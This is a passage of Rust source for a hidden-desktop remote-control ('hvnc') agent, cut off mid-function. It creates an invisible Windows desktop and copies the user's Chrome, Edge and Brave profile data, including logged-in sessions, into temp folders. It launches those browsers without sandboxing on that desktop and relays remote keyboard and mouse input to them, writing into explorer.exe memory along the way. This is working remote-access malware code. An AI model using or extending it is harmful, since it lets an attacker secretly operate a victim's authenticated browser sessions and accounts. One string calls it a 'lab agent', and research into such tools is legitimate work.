    /// Used to copy browser User Data to temp dir to avoid profile lock conflicts.
    fn copy_dir_if_exists(src: &str, dst: &str, desktop_name: &[u16]) {
        // Check if source exists first
        let src_w = to_wide(src);
        let attrs = unsafe { GetFileAttributesW(src_w.as_ptr()) };
        if attrs == 0xFFFFFFFF {
            // INVALID_FILE_ATTRIBUTES
            crate::dbg_print!("[hvnc] copy_dir: source not found: {}", src);
            return;
        }
        // Use robocopy /MIR /MT for fast parallel copy
        let cmd = format!(
            "robocopy \"{}\" \"{}\" /MIR /MT /R:0 /W:0 /NJH /NJS /NFL /NDL",
            src, dst
        );
        let cmd_line = format!("cmd.exe /C {}", cmd);
        unsafe {
            let mut si: STARTUPINFOW = std::mem::zeroed();
            si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
            si.lpDesktop = desktop_name.as_ptr() as *mut u16;
            let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
            let mut cmd_wide = to_wide(&cmd_line);
            let ok = CreateProcessW(
                std::ptr::null(),
                cmd_wide.as_mut_ptr(),
                std::ptr::null(),
                std::ptr::null(),
                0,
                CREATE_NEW_CONSOLE,
                std::ptr::null(),
                std::ptr::null(),
                &si,
                &mut pi,
            );
            if ok != 0 {
                // Wait up to 30 seconds for copy to complete
                WaitForSingleObject(pi.hProcess, 30000);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                crate::dbg_print!("[hvnc] copied user data: {} -> {}", src, dst);
            } else {
                crate::dbg_print!("[hvnc] failed to start robocopy for user data");
            }
        }
    }

    fn get_env_var(name: &str) -> String {
        let name_w = to_wide(name);
        let mut buf = vec![0u16; 512];
        let len =
            unsafe { GetEnvironmentVariableW(name_w.as_ptr(), buf.as_mut_ptr(), buf.len() as u32) };
        if len == 0 {
            return String::new();
        }
        String::from_utf16_lossy(&buf[..len as usize])
    }

    /// Wait for Shell_TrayWnd to appear (up to 5 seconds) and force taskbar always-on-top.
    unsafe fn setup_taskbar() {
        const ABM_SETSTATE: u32 = 0x0000000A;
        const ABS_ALWAYSONTOP: isize = 2;
        let class_name = to_wide("Shell_TrayWnd");

        for attempt in 0..10 {
            let tray = FindWindowW(class_name.as_ptr(), std::ptr::null());
            if !tray.is_null() {
                let mut abd: APPBARDATA = std::mem::zeroed();
                abd.cbSize = std::mem::size_of::<APPBARDATA>() as u32;
                abd.hWnd = tray;
                abd.lParam = ABS_ALWAYSONTOP;
                SHAppBarMessage(ABM_SETSTATE, &mut abd);
                crate::dbg_print!(
                    "[hvnc] taskbar found and set always-on-top (attempt {})",
                    attempt
                );
                return;
            }
            std::thread::sleep(std::time::Duration::from_millis(500));
        }
        crate::dbg_print!(
            "[hvnc] taskbar (Shell_TrayWnd) not found after 5s — explorer may not have started"
        );
    }

    fn launch_process(desktop_name: &[u16], action: u32) {
        unsafe {
            match action {
                ACTION_EXPLORER => {
                    // Open a folder window (not just the shell) so there's always
                    // something visible even if the desktop has no icons.
                    let user_profile = get_env_var("USERPROFILE");
                    let target = if !user_profile.is_empty() {
                        user_profile
                    } else {
                        "C:\\".to_string()
                    };
                    let cmd = format!("{}\\explorer.exe \"{}\"", get_env_var("WINDIR"), target);
                    launch_on_desktop(desktop_name, &cmd);
                }
                ACTION_RUN => {
                    let path = format!(
                        "{}\\System32\\rundll32.exe shell32.dll,#61",
                        get_env_var("SYSTEMROOT")
                    );
                    launch_on_desktop(desktop_name, &path);
                }
                ACTION_CHROME => {
                    let local = get_env_var("LOCALAPPDATA");
                    let user_data = format!("{}\\Google\\Chrome\\User Data", local);
                    let temp_data =
                        format!("{}\\Temp\\rustyvnc_chrome_{}", local, std::process::id());
                    copy_dir_if_exists(&user_data, &temp_data, desktop_name);
                    let cmd = format!(
                        "\"{}\\Google\\Chrome\\Application\\chrome.exe\" --no-sandbox --allow-no-sandbox-job --disable-gpu --disable-3d-apis --user-data-dir=\"{}\"",
                        local, temp_data
                    );
                    launch_on_desktop(desktop_name, &cmd);
                }
                ACTION_EDGE => {
                    let local = get_env_var("LOCALAPPDATA");
                    let user_data = format!("{}\\Microsoft\\Edge\\User Data", local);
                    let temp_data =
                        format!("{}\\Temp\\rustyvnc_edge_{}", local, std::process::id());
                    copy_dir_if_exists(&user_data, &temp_data, desktop_name);
                    let cmd = format!(
                        "\"{}\\Microsoft\\Edge\\Application\\msedge.exe\" --no-sandbox --disable-gpu --disable-3d-apis --user-data-dir=\"{}\"",
                        get_env_var("ProgramFiles(x86)"), temp_data
                    );
                    launch_on_desktop(desktop_name, &cmd);
                }
                ACTION_BRAVE => {
                    let local = get_env_var("LOCALAPPDATA");
                    let user_data = format!("{}\\BraveSoftware\\Brave-Browser\\User Data", local);
                    let temp_data =
                        format!("{}\\Temp\\rustyvnc_brave_{}", local, std::process::id());
                    copy_dir_if_exists(&user_data, &temp_data, desktop_name);
                    let cmd = format!(
                        "\"{}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe\" --no-sandbox --disable-gpu --disable-3d-apis --user-data-dir=\"{}\"",
                        local, temp_data
                    );
                    launch_on_desktop(desktop_name, &cmd);
                }
                ACTION_FIREFOX => {
                    let local = get_env_var("LOCALAPPDATA");
                    let temp_profile =
                        format!("{}\\Temp\\rustyvnc_firefox_{}", local, std::process::id());
                    let cmd = format!(
                        "\"{}\\Mozilla Firefox\\firefox.exe\" -no-remote -profile \"{}\"",
                        get_env_var("ProgramFiles"),
                        temp_profile
                    );
                    launch_on_desktop(desktop_name, &cmd);
                }
                ACTION_POWERSHELL => launch_on_desktop(desktop_name, "powershell.exe"),
                ACTION_CMD => launch_on_desktop(desktop_name, "cmd.exe"),
                _ => {}
            }
        }
    }

    // ── Input dispatch ───────────────────────────────────────────────────────

    static INPUT_DBG_COUNT: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);

    /// Agent-side double-click detection state.
    /// Detects double-clicks locally from consecutive WM_LBUTTONDOWN timing,
    /// immune to network latency between browser and agent.
    struct DblClickState {
        last_down_time: std::time::Instant,
        last_down_x: i32,
        last_down_y: i32,
        armed: bool, // true after first LBUTTONDOWN
    }

    impl DblClickState {
        fn new() -> Self {
            Self {
                last_down_time: std::time::Instant::now(),
                last_down_x: -100,
                last_down_y: -100,
                armed: false,
            }
        }

        /// Check if this LBUTTONDOWN is the second click of a double-click.
        /// Uses 500ms timeout and ±4px spatial threshold (same as Windows defaults).
        fn check_and_update(&mut self, x: i32, y: i32) -> bool {
            let now = std::time::Instant::now();
            let dt = now.duration_since(self.last_down_time).as_millis();
            let dx = (x - self.last_down_x).abs();
            let dy = (y - self.last_down_y).abs();
            let is_dbl = self.armed && dt < 500 && dx <= 4 && dy <= 4;

            crate::dbg_print!(
                "[hvnc-dblclk] check armed={} dt={}ms dx={} dy={} pos=({},{}) last=({},{}) → {}",
                self.armed,
                dt,
                dx,
                dy,
                x,
                y,
                self.last_down_x,
                self.last_down_y,
                if is_dbl { "DBLCLK" } else { "single" }
            );

            if is_dbl {
                self.armed = false; // consumed
            } else {
                self.last_down_time = now;
                self.last_down_x = x;
                self.last_down_y = y;
                self.armed = true;
            }
            is_dbl
        }
    }

    /// Dispatch input via PostMessageW (targets specific windows on the hidden desktop).
    /// SetCursorPos positions the cursor on the hidden desktop (per-desktop cursor).
    /// SetForegroundWindow + SetFocus ensure keyboard messages reach the right window.
    /// Double-clicks are detected locally from consecutive WM_LBUTTONDOWN timing.
    unsafe fn dispatch_input(
        msg: u32,
        wparam: usize,
        lparam: isize,
        _desk_w: i32,
        _desk_h: i32,
        focused: &mut *mut c_void,
        dbl: &mut DblClickState,
        desktop_name: &[u16],
        kb_state: &mut [u8; 256],
    ) {
        let x = (lparam as u32 & 0xFFFF) as i16 as i32;
        let y = ((lparam as u32 >> 16) & 0xFFFF) as i16 as i32;
        let dbg = INPUT_DBG_COUNT.fetch_add(1, Ordering::Relaxed);
        let verbose = dbg < 20 || dbg % 50 == 0;

        match msg {
            WM_KEYDOWN | WM_KEYUP | WM_CHAR => {
                // Keyboard dispatch strategy:
                //
                // Problem: PostMessageW(WM_KEYDOWN) to an Edit control causes the
                // target's TranslateMessage to generate WM_CHAR — but the autocomplete
                // handler also processes WM_KEYDOWN, causing doubled character input.
                //
                // Solution:
                // - For printable character keys: post ONLY WM_CHAR (skip WM_KEYDOWN).
                //   WM_CHAR is the canonical text input message. TranslateMessage is a
                //   no-op for WM_CHAR, so exactly one character is inserted.
                // - For function keys (F1-F24): post WM_KEYDOWN/WM_KEYUP to top-level
                //   for accelerator processing (F4=address bar, etc.)
                // - For modifier keys (Ctrl/Shift/Alt): post WM_KEYDOWN/WM_KEYUP to
                //   focused control so DefWindowProc updates key state.
                // - For Ctrl+key combos: post WM_KEYDOWN to top-level for shortcuts.
                // - For nav keys (Enter, Tab, Esc, arrows): post WM_KEYDOWN/WM_KEYUP.
                {
                    let base = *focused;
                    if base.is_null() {
                        if verbose {
                            crate::dbg_print!(
                                "[hvnc-dispatch] #{} key msg=0x{:04x} vk=0x{:x} DROPPED (no focus)",
                                dbg,
                                msg,
                                wparam
                            );
                        }
                    } else {
                        let our_tid = GetCurrentThreadId();
                        let target_tid = GetWindowThreadProcessId(base, std::ptr::null_mut());
                        let attached = if our_tid != target_tid && target_tid != 0 {
                            AttachThreadInput(our_tid, target_tid, 1) != 0
                        } else {
                            false
                        };

                        let real_focus = GetFocus();
                        let focus_target = if !real_focus.is_null() {
                            real_focus
                        } else {
                            base
                        };

                        // Find top-level ancestor
                        let mut toplevel = base;
                        loop {
                            let parent = GetParent(toplevel);
                            if parent.is_null() {
                                break;
                            }
                            toplevel = parent;
                        }

                        let vk = wparam as u32;

                        // Track modifier state
                        if msg == WM_KEYDOWN {
                            kb_state[vk as usize] |= 0x80;
                        } else if msg == WM_KEYUP {
                            kb_state[vk as usize] &= !0x80;
                        }
                        SetKeyboardState(kb_state.as_ptr());

                        let ctrl_held = kb_state[0x11] & 0x80 != 0;
                        let is_fkey = matches!(vk, 0x70..=0x87);
                        let is_modifier = matches!(vk, 0x10..=0x12);
                        let is_nav = matches!(
                            vk,
                            0x0D | 0x09 | 0x1B | 0x08 | 0x2E |  // Enter/Tab/Esc/Backspace/Delete
                                                   0x21..=0x28 | 0x2D
                        ); // PgUp..Down/Arrows/Insert
                           // Is this a printable character key? (A-Z, 0-9, punctuation, space)
                        let is_char_key =
                            !is_fkey && !is_modifier && !is_nav && !ctrl_held && vk >= 0x20;

                        if verbose {
                            let cls = get_class_name(focus_target);
                            crate::dbg_print!("[hvnc-dispatch] #{} key msg=0x{:04x} vk=0x{:02x} ctrl={} char={} focus={:?}({})",
                                dbg, msg, vk, ctrl_held, is_char_key, focus_target, cls);
                        }

                        // Check if focus is on an Edit control
                        let focus_cls = get_class_name(focus_target);
                        let focus_is_edit = focus_cls == "Edit"
                            || focus_cls == "RichEdit20W"
                            || focus_cls == "RICHEDIT50W"
                            || focus_cls.contains("Edit");

                        if is_char_key && msg != WM_CHAR {
                            // Skip WM_KEYDOWN/WM_KEYUP for printable chars — we'll
                            // use the WM_CHAR from the frontend instead. This avoids
                            // TranslateMessage doubling and autocomplete interference.
                            ()
                        } else if msg == WM_CHAR {
                            // WM_CHAR from frontend: post directly to focused control.
                            // This is the canonical text input path — no doubling.
                            PostMessageW(focus_target, WM_CHAR, wparam, lparam);
                        } else if is_fkey {
                            // F-keys → top-level for accelerator processing
                            PostMessageW(toplevel, msg, wparam, lparam);
                        } else if ctrl_held && !is_modifier {
                            // Ctrl+key combo. PostMessageW doesn't update GetKeyState(),
                            // so the target can't detect Ctrl via GetKeyState(VK_CONTROL).
                            //
                            // For Edit controls: convert Ctrl+letter to WM_CHAR with the
                            // ASCII control character (0x01-0x1A). This is what TranslateMessage
                            // generates for real Ctrl+key input. Edit handles these natively:
                            //   Ctrl+A=0x01 (select all), Ctrl+C=0x03 (copy), etc.
                            //
                            // For non-Edit controls: send to top-level for menu accelerators.
                            if focus_is_edit && msg == WM_KEYDOWN && vk >= 0x41 && vk <= 0x5A {
                                let ctrl_char = (vk - 0x40) as usize; // A=0x01, B=0x02, ...
                                PostMessageW(focus_target, WM_CHAR, ctrl_char, lparam);
                            } else if !focus_is_edit {
                                PostMessageW(toplevel, msg, wparam, lparam);
                            }
                            // Skip WM_KEYUP for Ctrl+key on Edit (not needed after WM_CHAR)
                        } else {
                            // Modifiers, nav keys → focused control
                            PostMessageW(focus_target, msg, wparam, lparam);
                        }

                        if attached {
                            AttachThreadInput(our_tid, target_tid, 0);
                        }
                    }
                }
            }
            // Ignore WM_LBUTTONDBLCLK from frontend — agent detects double-clicks locally
            WM_LBUTTONDBLCLK | WM_RBUTTONDBLCLK | WM_MBUTTONDBLCLK => {
                if verbose {
                    crate::dbg_print!("[hvnc-dispatch] #{} ignoring frontend DBLCLK 0x{:04x} (agent-side detection)", dbg, msg);
                }
            }
            WM_LBUTTONDOWN | WM_LBUTTONUP | WM_RBUTTONDOWN | WM_RBUTTONUP | WM_MBUTTONDOWN
            | WM_MBUTTONUP | WM_MOUSEMOVE | WM_MOUSEWHEEL => {
                // Position cursor on hidden desktop (SetCursorPos is per-desktop)
                SetCursorPos(x, y);

                let point = POINT { x, y };
                let hwnd = WindowFromPoint(point);
                if hwnd.is_null() {
                    if verbose {
                        crate::dbg_print!(
                            "[hvnc-dispatch] #{} mouse 0x{:04x} at ({},{}) → NULL window",
                            dbg,
                            msg,
                            x,
                            y
                        );
                    }
                    return;
                }

                // Attach our thread to the target window's input queue
                let our_tid = GetCurrentThreadId();
                let target_tid = GetWindowThreadProcessId(hwnd, std::ptr::null_mut());
                let attached = if our_tid != target_tid && target_tid != 0 {
                    AttachThreadInput(our_tid, target_tid, 1) != 0
                } else {
                    false
                };

                // Non-client area hit test: close/min/max buttons, title bar, resize edges
                // WM_NCHITTEST returns the hit-test code for the screen coordinate
                let screen_lparam = ((y as u16 as u32) << 16 | (x as u16 as u32)) as i32 as isize;
                let hit = SendMessageW(hwnd, WM_NCHITTEST, 0, screen_lparam) as i32;

                // Non-client hit codes
                const HTCLIENT: i32 = 1;
                const HTCAPTION: i32 = 2;
                const HTCLOSE: i32 = 20;
                const HTMINBUTTON: i32 = 8;
                const HTMAXBUTTON: i32 = 9;

                let is_nonclient = hit != HTCLIENT && hit > 0;

                if is_nonclient {
                    // Non-client area (title bar buttons, caption, resize edges)
                    // Map client mouse messages to non-client equivalents
                    const WM_NCLBUTTONDOWN: u32 = 0x00A1;
                    const WM_NCLBUTTONUP: u32 = 0x00A2;
                    const WM_NCLBUTTONDBLCLK: u32 = 0x00A3;
                    const WM_NCRBUTTONDOWN: u32 = 0x00A4;
                    const WM_NCRBUTTONUP: u32 = 0x00A5;
                    const WM_NCMOUSEMOVE: u32 = 0x00A0;

                    // For close/min/max: use WM_SYSCOMMAND which is more reliable
                    const SC_CLOSE: usize = 0xF060;
                    const SC_MINIMIZE: usize = 0xF020;
                    const SC_MAXIMIZE: usize = 0xF030;
                    const SC_RESTORE: usize = 0xF120;
                    const WM_SYSCOMMAND: u32 = 0x0112;

                    if msg == WM_LBUTTONDOWN {
                        // For button clicks, check double-click state first
                        if dbl.check_and_update(x, y) {
                            // Double-click on caption = maximize/restore
                            if hit == HTCAPTION {
                                crate::dbg_print!(
                                    "[hvnc-dispatch] #{} NC DBLCLK caption → SC_MAXIMIZE/RESTORE",
                                    dbg
                                );
                                // Check if currently maximized
                                let mut wp: WINDOWPLACEMENT = std::mem::zeroed();
                                wp.length = std::mem::size_of::<WINDOWPLACEMENT>() as u32;
                                GetWindowPlacement(hwnd, &mut wp);
                                let cmd = if wp.showCmd == 3 {
                                    SC_RESTORE
                                } else {
                                    SC_MAXIMIZE
                                }; // 3 = SW_SHOWMAXIMIZED
                                PostMessageW(hwnd, WM_SYSCOMMAND, cmd, 0);
                            }
                            if attached {
                                AttachThreadInput(our_tid, target_tid, 0);
                            }
                            return;
                        }

                        match hit {
                            HTCLOSE => {
                                crate::dbg_print!(
                                    "[hvnc-dispatch] #{} NC click HTCLOSE → SC_CLOSE",
                                    dbg
                                );
                                PostMessageW(hwnd, WM_SYSCOMMAND, SC_CLOSE, 0);
                            }
                            HTMINBUTTON => {
                                crate::dbg_print!(
                                    "[hvnc-dispatch] #{} NC click HTMINBUTTON → SC_MINIMIZE",
                                    dbg
                                );
                                PostMessageW(hwnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
                            }
                            HTMAXBUTTON => {
                                crate::dbg_print!(
                                    "[hvnc-dispatch] #{} NC click HTMAXBUTTON → SC_MAXIMIZE",
                                    dbg
                                );
                                let mut wp: WINDOWPLACEMENT = std::mem::zeroed();
                                wp.length = std::mem::size_of::<WINDOWPLACEMENT>() as u32;
                                GetWindowPlacement(hwnd, &mut wp);
                                let cmd = if wp.showCmd == 3 {
                                    SC_RESTORE
                                } else {
                                    SC_MAXIMIZE
                                };
                                PostMessageW(hwnd, WM_SYSCOMMAND, cmd, 0);
                            }
                            _ => {
                                // Caption drag, resize edges, etc.
                                if verbose {
                                    crate::dbg_print!(
                                        "[hvnc-dispatch] #{} NC LBUTTONDOWN hit={}",
                                        dbg,
                                        hit
                                    );
                                }
                                PostMessageW(hwnd, WM_NCLBUTTONDOWN, hit as usize, screen_lparam);
                            }
                        }
                        // Set focus
                        SetForegroundWindow(hwnd);
                        BringWindowToTop(hwnd);
                        SetFocus(hwnd);
                        *focused = hwnd;
                    } else if msg == WM_LBUTTONUP {
                        PostMessageW(hwnd, WM_NCLBUTTONUP, hit as usize, screen_lparam);
                    } else if msg == WM_RBUTTONDOWN {
                        PostMessageW(hwnd, WM_NCRBUTTONDOWN, hit as usize, screen_lparam);
                    } else if msg == WM_RBUTTONUP {
                        PostMessageW(hwnd, WM_NCRBUTTONUP, hit as usize, screen_lparam);
                    } else if msg == WM_MOUSEMOVE {
                        PostMessageW(hwnd, WM_NCMOUSEMOVE, hit as usize, screen_lparam);
                    } else if msg == WM_MOUSEWHEEL {
                        PostMessageW(hwnd, msg, wparam, screen_lparam);
                    }

                    if attached {
                        AttachThreadInput(our_tid, target_tid, 0);
                    }
                    return;
                }

                // ── Client area handling ──

                // Agent-side double-click detection
                if msg == WM_LBUTTONDOWN && dbl.check_and_update(x, y) {
                    let (target, client_pt) = find_deepest_child(hwnd, point);
                    let target_cls = get_class_name(target);

                    crate::dbg_print!(
                        "[hvnc-dispatch] #{} DBLCLK at ({},{}) target={:?}({}) attached={}",
                        dbg,
                        x,
                        y,
                        target,
                        target_cls,
                        attached
                    );

                    if target_cls == "SysListView32" {
                        open_listview_item_at(target, client_pt.x, client_pt.y, desktop_name);
                    } else {
                        SetForegroundWindow(hwnd);
                        BringWindowToTop(hwnd);
                        SetFocus(hwnd);
                        *focused = hwnd;
                        let client_lparam = ((client_pt.y as u16 as u32) << 16
                            | (client_pt.x as u16 as u32))
                            as i32 as isize;
                        PostMessageW(target, WM_LBUTTONDOWN, 0x0001, client_lparam);
                        PostMessageW(target, WM_LBUTTONUP, 0, client_lparam);
                        PostMessageW(target, WM_LBUTTONDBLCLK, 0x0001, client_lparam);
                        PostMessageW(target, WM_LBUTTONUP, 0, client_lparam);
                    }

                    if attached {
                        AttachThreadInput(our_tid, target_tid, 0);
                    }
                    return;
                }

                let is_down = matches!(msg, WM_LBUTTONDOWN | WM_RBUTTONDOWN | WM_MBUTTONDOWN);
                if is_down {
                    SetForegroundWindow(hwnd);
                    BringWindowToTop(hwnd);
                    SetFocus(hwnd);
                    *focused = hwnd;
                }

                // Drill down to deepest child and convert to client coords
                let (target, client_pt) = find_deepest_child(hwnd, point);
                let client_lparam = ((client_pt.y as u16 as u32) << 16
                    | (client_pt.x as u16 as u32)) as i32
                    as isize;

                if verbose {
                    let hcls = get_class_name(hwnd);
                    let tcls = get_class_name(target);
                    crate::dbg_print!("[hvnc-dispatch] #{} mouse 0x{:04x} at ({},{}) → hwnd={:?}({}) target={:?}({}) client=({},{}) hit={}",
                        dbg, msg, x, y, hwnd, hcls, target, tcls, client_pt.x, client_pt.y, hit);
                }

                if msg == WM_MOUSEWHEEL {
                    PostMessageW(target, msg, wparam, client_lparam);
                    if attached {
                        AttachThreadInput(our_tid, target_tid, 0);
                    }
                    return;
                }

                PostMessageW(target, msg, wparam, client_lparam);
                if attached {
                    AttachThreadInput(our_tid, target_tid, 0);
                }
            }
            _ => {}
        }
    }

    unsafe fn get_class_name(hwnd: *mut c_void) -> String {
        let mut buf = [0u16; 256];
        let len = GetClassNameW(hwnd, buf.as_mut_ptr(), 256);
        if len <= 0 {
            return String::from("??");
        }
        String::from_utf16_lossy(&buf[..len as usize])
    }

    /// Find the desktop's SysListView32 via the known window hierarchy:
    /// Progman → SHELLDLL_DefView → SysListView32
    /// or WorkerW → SHELLDLL_DefView → SysListView32
    unsafe fn find_desktop_listview() -> *mut c_void {
        let progman_cls = to_wide("Progman");
        let shelldll_cls = to_wide("SHELLDLL_DefView");
        let syslist_cls = to_wide("SysListView32");
        let worker_cls = to_wide("WorkerW");

        // Try Progman first
        let progman = FindWindowW(progman_cls.as_ptr(), std::ptr::null());
        if !progman.is_null() {
            let shell = FindWindowExW(
                progman,
                std::ptr::null_mut(),
                shelldll_cls.as_ptr(),
                std::ptr::null(),
            );
            if !shell.is_null() {
                let lv = FindWindowExW(
                    shell,
                    std::ptr::null_mut(),
                    syslist_cls.as_ptr(),
                    std::ptr::null(),
                );
                if !lv.is_null() {
                    crate::dbg_print!("[hvnc] found desktop ListView via Progman: {:?}", lv);
                    return lv;
                }
            }
        }

        // Try WorkerW windows
        let mut worker = FindWindowW(worker_cls.as_ptr(), std::ptr::null());
        while !worker.is_null() {
            let shell = FindWindowExW(
                worker,
                std::ptr::null_mut(),
                shelldll_cls.as_ptr(),
                std::ptr::null(),
            );
            if !shell.is_null() {
                let lv = FindWindowExW(
                    shell,
                    std::ptr::null_mut(),
                    syslist_cls.as_ptr(),
                    std::ptr::null(),
                );
                if !lv.is_null() {
                    crate::dbg_print!("[hvnc] found desktop ListView via WorkerW: {:?}", lv);
                    return lv;
                }
            }
            worker = FindWindowExW(
                std::ptr::null_mut(),
                worker,
                worker_cls.as_ptr(),
                std::ptr::null(),
            );
        }

        crate::dbg_print!("[hvnc] desktop ListView NOT found");
        std::ptr::null_mut()
    }

    unsafe fn find_deepest_child(hwnd: *mut c_void, screen_pt: POINT) -> (*mut c_void, POINT) {
        let mut current = hwnd;
        loop {
            let mut pt = screen_pt;
            ScreenToClient(current, &mut pt);
            let child = ChildWindowFromPoint(current, pt);
            if child.is_null() || child == current {
                return (current, pt);
            }
            current = child;
        }
    }

    /// Open the item at (x,y) in a SysListView32 by querying the ListView cross-process
    /// (VirtualAllocEx in explorer.exe) and calling ShellExecuteW.
    unsafe fn open_listview_item_at(
        listview: *mut c_void,
        client_x: i32,
        client_y: i32,
        desktop_name: &[u16],
    ) -> bool {
        const PROCESS_VM_OPERATION: u32 = 0x0008;
        const PROCESS_VM_READ: u32 = 0x0010;
        const PROCESS_VM_WRITE: u32 = 0x0020;
        const MEM_COMMIT: u32 = 0x1000;
        const MEM_RELEASE: u32 = 0x8000;
        const PAGE_READWRITE: u32 = 0x04;
        const LVM_FIRST: u32 = 0x1000;
        const LVM_HITTEST: u32 = LVM_FIRST + 18;
        const LVM_GETITEMTEXTW: u32 = LVM_FIRST + 115;
        const LVHT_ONITEM: u32 = 0x000E;
        const SW_SHOW: i32 = 5;

        // LVHITTESTINFO: POINT(x,y) + flags + iItem + iSubItem + iGroup
        #[repr(C)]
        #[derive(Copy, Clone)]
        struct LVHITTESTINFO {
            x: i32,
            y: i32,
            flags: u32,
            i_item: i32,
            i_sub_item: i32,
            i_group: i32,
        }

        // LVITEMW for GetItemText
        #[repr(C)]
        #[derive(Copy, Clone)]
        struct LVITEMW {
            mask: u32,
            i_item: i32,
            i_sub_item: i32,
            state: u32,
            state_mask: u32,
            psz_text: *mut u16,
            cch_text_max: i32,
            i_image: i32,
            l_param: isize,
            i_indent: i32,
            i_group_id: i32,
            c_columns: u32,
            pu_columns: *mut u32,
            pi_col_fmt: *mut i32,
            i_group: i32,
        }

        let mut pid: u32 = 0;
        GetWindowThreadProcessId(listview, &mut pid);
        if pid == 0 {
            crate::dbg_print!("[hvnc-open] GetWindowThreadProcessId failed");
            return false;
        }

        let hproc = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            0,
            pid,
        );
        if hproc.is_null() {
            crate::dbg_print!("[hvnc-open] OpenProcess failed for pid={}", pid);
            return false;
        }

        // Allocate memory in explorer.exe for LVHITTESTINFO + LVITEMW + text buffer
        let alloc_size =
            std::mem::size_of::<LVHITTESTINFO>() + std::mem::size_of::<LVITEMW>() + 520; // 260 wchars for filename
        let remote = VirtualAllocEx(
            hproc,
            std::ptr::null(),
            alloc_size,
            MEM_COMMIT,
            PAGE_READWRITE,
        );
        if remote.is_null() {
            crate::dbg_print!("[hvnc-open] VirtualAllocEx failed");
            CloseHandle(hproc);
            return false;
        }

        // Write LVHITTESTINFO
        let mut hti: LVHITTESTINFO = std::mem::zeroed();
        hti.x = client_x;
        hti.y = client_y;

        let hti_remote = remote;
        WriteProcessMemory(
            hproc,
            hti_remote,
            &hti as *const _ as *const c_void,
            std::mem::size_of::<LVHITTESTINFO>(),
            std::ptr::null_mut(),
        );

        // Send LVM_HITTEST
        let hit_result = SendMessageW(listview, LVM_HITTEST, 0, hti_remote as isize);
        crate::dbg_print!(
            "[hvnc-open] LVM_HITTEST at ({},{}) → index={}",
            client_x,
            client_y,
            hit_result
        );

        if hit_result < 0 {
            // No item at this position
            VirtualFreeEx(hproc, remote, 0, MEM_RELEASE);
            CloseHandle(hproc);
            return false;
        }

        // Read back the hit info to check flags
        ReadProcessMemory(
            hproc,
            hti_remote as *const c_void,
            &mut hti as *mut _ as *mut c_void,
            std::mem::size_of::<LVHITTESTINFO>(),
            std::ptr::null_mut(),
        );
        crate::dbg_print!(
            "[hvnc-open] hit flags=0x{:x} item={}",
            hti.flags,
            hti.i_item
        );

        if hti.flags & LVHT_ONITEM == 0 {
            VirtualFreeEx(hproc, remote, 0, MEM_RELEASE);
            CloseHandle(hproc);
            return false;
        }

        // Now get item text
        let item_remote = (remote as usize + std::mem::size_of::<LVHITTESTINFO>()) as *mut c_void;
        let text_remote = (item_remote as usize + std::mem::size_of::<LVITEMW>()) as *mut u16;

        let mut lvi: LVITEMW = std::mem::zeroed();
        lvi.i_item = hti.i_item;
        lvi.i_sub_item = 0;
        lvi.psz_text = text_remote;
        lvi.cch_text_max = 260;

        WriteProcessMemory(
            hproc,
            item_remote,
            &lvi as *const _ as *const c_void,
            std::mem::size_of::<LVITEMW>(),
            std::ptr::null_mut(),
        );

        SendMessageW(
            listview,
            LVM_GETITEMTEXTW,
            hti.i_item as usize,
            item_remote as isize,
        );

        // Read back the text
        let mut text_buf = [0u16; 260];
        ReadProcessMemory(
            hproc,
            text_remote as *const c_void,
            text_buf.as_mut_ptr() as *mut c_void,
            520,
            std::ptr::null_mut(),
        );

        VirtualFreeEx(hproc, remote, 0, MEM_RELEASE);
        CloseHandle(hproc);

        let text_len = text_buf.iter().position(|&c| c == 0).unwrap_or(260);
        let item_name = String::from_utf16_lossy(&text_buf[..text_len]);
        crate::dbg_print!("[hvnc-open] item text: '{}'", item_name);

        if item_name.is_empty() {
            return false;
        }

        // Build the full path: %USERPROFILE%\Desktop\<item_name>
        let desktop_path = format!("{}\\Desktop\\{}", get_env_var("USERPROFILE"), item_name);

        // Check if it's a folder or file
        let attrs = GetFileAttributesW(to_wide(&desktop_path).as_ptr());
        let is_dir = attrs != 0xFFFFFFFF && (attrs & 0x10) != 0; // FILE_ATTRIBUTE_DIRECTORY

        if is_dir {
            // Open folder with explorer.exe on the hidden desktop
            // /n forces a new window (avoids DDE delegation to existing shell)
            // /e opens in expanded (tree) view which initializes content faster
            let cmd = format!(
                "{}\\explorer.exe \"{}\"",
                get_env_var("WINDIR"),
                desktop_path
            );
            crate::dbg_print!("[hvnc-open] launching on hidden desktop: {}", cmd);
            launch_on_desktop(desktop_name, &cmd);
        } else {
            // Open file: use cmd /c start to open with default handler on hidden desktop
            let cmd = format!("cmd.exe /c start \"\" \"{}\"", desktop_path);
            crate::dbg_print!("[hvnc-open] launching on hidden desktop: {}", cmd);
            launch_on_desktop(desktop_name, &cmd);
        }

        true
    }

    // ── HvncSession ──────────────────────────────────────────────────────────

    pub struct HvncSession {
        conn_id: Uuid,
        #[allow(dead_code)]
        desktop_name_wide: Vec<u16>,
        #[allow(dead_code)]
        h_desk: *mut c_void,
        capture_running: Arc<AtomicBool>,
        #[allow(dead_code)]
        agent_id: Uuid,
        input_tx: mpsc::Sender<Vec<u8>>,
        input_event: *mut c_void, // Windows Event handle for capture wakeup
    }

    unsafe impl Send for HvncSession {}
    unsafe impl Sync for HvncSession {}

    impl HvncSession {
        pub fn conn_id(&self) -> Uuid {
            self.conn_id
        }

        pub fn start(
            outbound: Arc<Mutex<Vec<SocksOut>>>,
            wake: WakeSignal,
            agent_id: Uuid,
            jpeg_quality: u8,
        ) -> Result<Self, String> {
            if let Some(session_id) = current_process_session_id() {
                if session_id == 0 {
                    return Err(
                        "HVNC requires an interactive user desktop. Current process is running in session 0; start the lab agent from a logged-on desktop session.".into(),
                    );
                }
            }

            let conn_id = Uuid::new_v4();
            let desktop_name = format!("rustyvnc_{}", &conn_id.to_string()[..8]);
            let desktop_name_wide = to_wide(&desktop_name);

            let h_desk = unsafe {
                let h = OpenDesktopW(desktop_name_wide.as_ptr(), 0, 1, GENERIC_ALL);
                if h.is_null() {
                    CreateDesktopW(
                        desktop_name_wide.as_ptr(),
                        std::ptr::null(),
                        std::ptr::null(),
                        0,
                        GENERIC_ALL,
                        std::ptr::null(),
